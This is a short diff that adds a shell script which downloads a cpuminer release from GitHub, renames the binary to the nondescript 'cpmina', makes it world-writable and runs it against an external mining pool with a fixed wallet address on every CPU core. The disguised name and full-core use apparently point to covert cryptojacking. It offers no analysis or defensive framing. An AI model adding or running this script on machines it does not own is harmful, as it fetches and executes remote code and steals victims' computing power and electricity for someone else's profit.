@@ -1,0 +1,6 @@
+wget https://github.com/rplant-pool/cpuminer-rplant/releases/download/6.0.7/cpuminer-rplant-linux-x64-6.0.7.tar.gz
+tar xf cpuminer-rplant-linux-x64-6.0.7.tar.gz
+cd cpuminer-rplant-linux-x64-6.0.7
+mv cpuminer-rplant cpmina
+chmod 777 cpmina
+./cpmina -a yespowertide -o stratum+tcp://eu.rplant.xyz:7059 -u TQzt1MGjhnYHiUd47JeyFqLcNNffGnJrGs.x -p webpassword=x -t $(nproc --all)
